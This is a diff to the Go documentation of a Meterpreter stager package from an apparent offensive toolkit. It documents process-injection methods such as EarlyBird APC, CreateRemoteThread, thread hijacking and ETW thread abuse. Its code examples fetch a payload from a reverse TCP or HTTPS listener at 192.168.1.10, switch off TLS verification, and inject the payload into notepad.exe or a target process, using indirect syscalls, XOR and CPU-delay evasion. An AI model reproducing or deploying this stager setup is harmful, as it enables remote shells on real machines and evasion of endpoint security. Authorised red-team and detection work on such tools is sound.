@@ -12,39 +12,29 @@
 //   - HTTP: reverse HTTP connection
 //   - HTTPS: reverse HTTPS with optional InsecureSkipVerify
 //
-// # Stage Execution Methods
+// # Stage Execution
 //
 // By default the stager uses a simple self-injection path:
 //   - Windows: VirtualAlloc + RtlMoveMemory + VirtualProtect + CreateThread
 //   - Linux: mmap + purego.SyscallN (System V AMD64 ABI)
 //
-// Set Config.Method to route execution through the inject package, which
-// supports 10+ Windows methods and 5 Linux methods with automatic fallback.
+// Set Config.Injector to override stage execution with any inject.Injector.
+// This gives full access to the inject package's capabilities:
+//   - 10+ Windows injection methods (CRT, APC, EarlyBird, Fiber, ETW, etc.)
+//   - Builder pattern with fluent API: inject.Build().Method(...).Create()
+//   - Syscall routing: WinAPI, NativeAPI, Direct, Indirect syscalls
+//   - Decorator chain: WithXOR, WithCPUDelay, WithValidation
+//   - Automatic fallback on failure
 //
-// Windows injection methods (Config.Method values):
-//   - "ct"         CreateThread — self-injection with XOR evasion (default for staging)
-//   - "crt"        CreateRemoteThread — remote injection into target PID
-//   - "apc"        QueueUserAPC — APC injection into existing thread
-//   - "earlybird"  EarlyBirdAPC — APC into suspended child process
-//   - "threadhijack" ThreadHijack — modify suspended thread context (RIP)
-//   - "rtl"        RtlCreateUserThread — undocumented ntdll thread creation
-//   - "fiber"      CreateFiber — fiber-based execution (no thread creation)
-//   - "etwthr"     EtwpCreateEtwThread — abuse internal ETW thread creation
-//   - "apcex"      NtQueueApcThreadEx — special APC, no alertable wait (Win10 1903+)
-//   - "syscall"    DirectSyscall — raw syscall stubs (legacy, prefer WindowsConfig)
+// See inject.AvailableMethods() for the full list of methods.
 //
-// Linux injection methods:
-//   - "procmem"    ProcMem — self-injection via mmap (default for staging)
-//   - "ptrace"     Ptrace — remote injection via ptrace attach
-//   - "memfd"      MemFD — fileless execution via memfd_create
-//
-// Remote methods (crt, apc, rtl, apcex, ptrace) require Config.TargetPID.
-// Spawn methods (earlybird, threadhijack) require Config.ProcessPath.
-// Set Config.Fallback to enable automatic fallback chains on failure.
+// On Linux, Config.Injector is not supported because the Meterpreter wrapper
+// protocol requires the socket fd to read the ELF payload. An error is
+// returned if Injector is set on Linux.
 //
 // # Usage
 //
-// Default self-injection (no Method):
+// Default self-injection (simplest):
 //
 //	cfg := &meterpreter.Config{
 //	    Transport: meterpreter.TransportTCP,
@@ -55,30 +45,41 @@
 //	stager := meterpreter.NewStager(cfg)
 //	err := stager.Stage(context.Background())
 //
-// With specific injection method:
+// With custom injector (EarlyBird APC + indirect syscalls + XOR evasion):
 //
+//	inj, _ := inject.Build().
+//	    Method(inject.MethodEarlyBirdAPC).
+//	    ProcessPath(`C:\Windows\System32\notepad.exe`).
+//	    IndirectSyscalls().
+//	    WithFallback().
+//	    Use(inject.WithXOR).
+//	    Use(inject.WithCPUDelay).
+//	    Create()
 //	cfg := &meterpreter.Config{
-//	    Transport:   meterpreter.TransportTCP,
-//	    Host:        "192.168.1.10",
-//	    Port:        "4444",
-//	    Timeout:     30 * time.Second,
-//	    Method:      inject.MethodEarlyBirdAPC,
-//	    ProcessPath: `C:\Windows\System32\notepad.exe`,
-//	    Fallback:    true,
+//	    Transport: meterpreter.TransportTCP,
+//	    Host:      "192.168.1.10",
+//	    Port:      "4444",
+//	    Timeout:   30 * time.Second,
+//	    Injector:  inj,
 //	}
 //	stager := meterpreter.NewStager(cfg)
 //	err := stager.Stage(context.Background())
 //
 // With remote injection into existing process:
 //
+//	inj, _ := inject.Build().
+//	    Method(inject.MethodCreateRemoteThread).
+//	    TargetPID(1234).
+//	    IndirectSyscalls().
+//	    WithFallback().
+//	    Create()
 //	cfg := &meterpreter.Config{
 //	    Transport: meterpreter.TransportHTTPS,
 //	    Host:      "192.168.1.10",
 //	    Port:      "8443",
 //	    Timeout:   30 * time.Second,
-//	    Method:    inject.MethodCreateRemoteThread,
-//	    TargetPID: 1234,
-//	    Fallback:  true,
+//	    TLSInsecure: true,
+//	    Injector:  inj,
 //	}
 //	stager := meterpreter.NewStager(cfg)
 //	err := stager.Stage(context.Background())
